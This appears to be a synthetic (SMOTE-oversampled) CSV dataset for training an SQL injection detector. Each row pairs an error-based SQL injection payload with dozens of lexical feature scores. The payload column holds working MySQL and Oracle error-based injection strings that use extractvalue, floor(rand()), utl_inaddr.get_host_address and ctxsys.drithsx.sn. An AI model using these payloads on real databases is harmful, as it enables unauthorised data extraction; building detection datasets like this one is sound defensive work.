id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001387,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000030,2.7464152110583817,306.0648986704497,40.47662246676124,4.0381252664322425,108.42986740028373,52.53244933522484,110.62595946817987,34.47662246676124,0.3554585321755513,0.1702417960381058,0.3612821213258671,0.11301755046047574,0.0,1.0,2.0,0.0,2.0,2.0,0.0,19.953244933522484,0.0,1.0467550664775165,5.476622466761242,6.476622466761242,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.429867400283726,1.4298674002837253,1.0,1.5233775332387582,0.47662246676124165,0.5233775332387582,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.5233775332387582,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.906489867044968
SMOTE_001388,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000045,0.14500271906303666,349.4698969873169,34.05890033474257,3.548410670015305,86.17670100422771,56.734948493658436,147.6171478241733,58.941099665257425,0.24663884862797286,0.16231882826595,0.4223791478858671,0.16866317522021002,0.0,0.9705498326287147,2.0294501673712855,0.0,0.0,2.9705498326287145,0.0,29.94109966525743,0.0,0.08835050211385587,0.9705498326287145,25.0,0.0,0.9705498326287147,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.9705498326287147,1.0,0.9705498326287147,0.029450167371285307,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.9705498326287145
SMOTE_001389,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000068,1.0153692836647532,330.30903997260833,37.53850117566495,3.927562699354084,109.0,55.0,128.07803291861862,38.23100705398971,0.33087218988981854,0.1669538572838534,0.3865924184239687,0.11558153440235935,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.231007053989703,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001390,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,1.4612386826977868,239.25929962328433,31.831266750381257,3.790806522797298,78.66253350076252,40.325067001525035,92.9342326217593,27.337466499237486,0.329042762648032,0.16890712945920056,0.38790560593646156,0.11414450195630584,3.168733249618742,0.0,0.0,0.0,0.0,2.0,0.0,16.337466499237486,0.0,0.0,5.0,2.831266750381258,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.4156333751906287,0.0,0.4156333751906288,0.0,0.5843666248093711,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.4156333751906285
SMOTE_001391,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,0.7044015072103937,334.6782296570711,33.13985247142259,3.482555636966296,82.81808212849369,49.559409885690364,145.16088517146446,57.139852471422586,0.2473298058629555,0.148052837522204,0.43387346678996636,0.17074388982487418,1.0,0.0,0.27970494284518266,0.0,0.0,2.139852471422591,0.0,30.58044258573223,0.0,0.4195574142677736,0.860147528577409,22.41955741426777,1.0,0.0,0.13985247142259133,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.13985247142259125,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.139852471422591
SMOTE_001392,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001393,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,0.8639040819137439,327.60657897822097,31.43442982970349,3.53679084447669,88.27595028382751,45.57923977293799,137.73771931881396,56.013669602641485,0.2696541674203389,0.13909806568454725,0.42034773749788285,0.17090002939723103,0.0,0.5792397729379892,0.0,0.0,0.0,2.144809943234497,0.0,29.1448099432345,0.28961988646899445,2.565570170296508,0.14480994323449714,22.144809943234495,0.0,0.14480994323449722,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1448099432344974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.144809943234497
SMOTE_001394,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,0.43532885222116385,345.0,34.0,3.7127720563317865,103.13662191214539,45.69070247028369,138.17267561757092,58.0,0.29894673018013157,0.13243681875444546,0.40050050903643747,0.1681159420289855,3.7409865736436165,0.0,0.17267561757092226,0.0,0.0,2.086337808785461,0.0,28.0,0.0,3.0,0.0,22.259013426356383,1.0,0.0,0.08633780878546121,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0863378087854611,1.0,1.9136621912145388,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001395,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000062,0.48020326722145723,329.72410855967945,38.69683785665331,3.93656282353838,110.0,55.0,126.93675713306622,37.78735142661324,0.33399709955760054,0.16699854977880024,0.3844614737763763,0.11454287688722295,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.78735142661324,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001396,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,1.057256749151897,194.62280639001108,33.01879726142383,3.9475543173159306,55.604009128587236,44.3583963485651,67.32080182571745,27.339599087141274,0.2853658621779598,0.22815451258073333,0.3459216437388615,0.14055798150244542,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.339599087141276,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.6604009128587243,0.3395990871412756,0.6604009128587243,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.660400912858725
SMOTE_001397,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000073,1.7396247400013878,269.10578995315694,36.670192998438566,4.008532405880568,99.36154398750853,40.361543987508526,97.04231598126279,32.34038599687713,0.36952224953279594,0.14964980789867902,0.36049749353692134,0.12033044903160368,0.3298070015614345,0.0,1.340385996877131,0.0,2.0,1.6701929984385655,0.0,18.670192998438566,0.0,2.0,5.329807001561434,5.010578995315696,0.3298070015614346,0.0,0.6701929984385655,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.6701929984385654,2.0,0.6701929984385655,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.340385996877131
SMOTE_001398,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,1.6373253008039468,209.56215213992334,35.01775775426381,3.697309761696687,55.0,40.0,88.05327326279145,26.508878877131906,0.2625252206642102,0.1909274332103347,0.42005541182919803,0.12649193429625702,0.4911211228680925,0.5088788771319075,2.0,0.0,1.0,2.0,0.0,15.508878877131908,0.0,0.0,4.0,5.0,0.49112112286809245,0.5088788771319075,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001399,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,1.0504688915363056,193.64188197645933,28.268588517655488,3.5014158596890796,48.52200160004776,34.01517543526322,84.37329345880386,26.731411482344512,0.25073521045891684,0.1755691309078944,0.43567170274033923,0.13802395589284952,4.0,0.0,0.0,0.0,0.0,1.8209409882296759,0.0,16.0,0.0,0.0,4.910470494114838,1.820940988229676,1.0,0.0,0.0,0.0,0.0,0.9104704941148379,1.0,0.0,0.0,1.0,0.0,0.9104704941148378,0.0,0.0,0.0,1.0,0.9104704941148378,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.08952950588516215,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9104704941148376
SMOTE_001400,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000048,0.4188261890148259,213.71400435936764,31.0,3.907943266902595,77.0,37.0,75.77120348749412,23.94280087187353,0.36049074008277493,0.1732228231566581,0.3543023577158419,0.11198407904472507,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.942800871873526,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001401,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,0.020371551333649474,233.84903329668236,32.99591981882925,3.9189339412689237,80.91023601424357,44.99183963765851,82.9387972824388,25.008160362341492,0.345963458941857,0.19241364000306704,0.3546619983614483,0.10696090269362771,2.008160362341494,0.0,0.0,0.0,0.0,2.0,0.0,13.991839637658506,0.0,0.0,5.0,4.008160362341494,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.004080181170747044,2.0,0.0,1.0,0.004080181170746933,-1.1102230246251565e-16,0.004080181170747099,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9959198188292531,0.9959198188292531,6.0
SMOTE_001402,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000068,0.28218980572096347,342.7403528529665,38.0,3.8694098372330625,109.39510874509497,55.0,138.03668441178775,40.308559696083805,0.31957200654517637,0.16061497528197052,0.40229092923424514,0.117522088938608,4.0,0.0,0.0,0.0,2.0,1.901222813726258,0.0,25.407336882357548,0.0,0.0,6.0,4.901222813726258,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001403,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000036,0.056872811086183625,330.7424049553525,38.98568916418625,3.869865809812513,102.11448668650999,55.0,132.713783283725,40.9141349851175,0.3087764812581571,0.16629989216003024,0.4012289451835477,0.12369468139826492,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.942756656745,1.971378328372501,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001404,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,0.18210675557427122,197.49474045647426,32.0,3.939366524926904,58.25788931528861,43.98948091294852,68.0,27.24737022823713,0.2950186084784296,0.22270371910880454,0.3443195074091205,0.13795816500364538,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.247370228237131,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001405,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,0.1007853981944257,323.34226132762103,33.95110552462557,3.6018404053958086,87.60884419700453,48.195577901497735,132.48894475374433,55.04889447537444,0.2709779311267643,0.14904534307587916,0.4097265283817755,0.17025019741558106,0.0,0.0,1.0,0.0,0.0,2.0,0.0,28.09778895074887,0.0,2.853316573876697,0.048894475374434254,23.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001406,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,1.5872183076370259,284.8959595699052,36.0,3.8673272926860696,97.91592286217147,40.2212304828953,112.49553717302885,34.263269051809566,0.34581542740844445,0.14113992556138036,0.39251279267547323,0.12053185435470196,0.3473461896380876,0.0,0.0,0.0,2.0,1.6526538103619126,0.0,21.915922862171474,0.0,2.0,5.347346189638087,3.6526538103619126,0.3473461896380875,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.305307620723825,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.305307620723825
SMOTE_001407,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000034,1.957782407984478,339.1572889071098,35.204745676987805,3.6255597002320457,89.61423703096341,51.578644453554894,140.1691530995793,57.7952543230122,0.2646252677695848,0.15184647238415624,0.413080248077457,0.17044801176880198,0.0,0.3976271615060991,2.602372838493901,0.0,0.0,2.397627161506099,0.0,28.7952543230122,0.0,1.8071185154817027,0.39762716150609867,25.0,0.0,0.3976271615060991,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.397627161506099,1.0,0.397627161506099,0.6023728384939009,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.397627161506099
SMOTE_001408,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,0.14306900791387595,323.77373131951384,34.06447760995949,3.6116402296964396,88.35462685477718,48.0,132.25791043983796,55.16119402489872,0.27286030743815465,0.14827545165249537,0.40850074979605666,0.1703634911132933,0.0,0.12895521991897696,1.0,0.0,0.0,2.032238804979744,0.0,28.0,0.0,3.0,0.0,23.03223880497974,0.0,0.03223880497974438,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.032238804979744295,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.032238804979745
SMOTE_001409,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000048,0.41470566271791537,211.8873813420144,31.262489212910403,3.9471580172794805,78.04995685164161,37.0,73.57493527746242,23.262489212910403,0.3683582561691602,0.17471002371347252,0.3471350590770902,0.10979666104027713,4.0,0.0,0.0,0.0,0.0,1.7375107870895983,0.0,12.524978425820805,0.0,0.0,5.0,1.7375107870895983,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001410,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,0.706162271866596,194.4498575587616,28.449857558761618,3.5098684432572105,48.79943023504648,35.0,84.10028488247676,26.55014244123838,0.2509369854701882,0.17999616667838603,0.43251962396790256,0.1365472238835232,4.0,0.0,0.0,0.0,0.0,1.5501424412383813,0.0,16.0,0.0,0.0,5.0,1.550142441238381,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
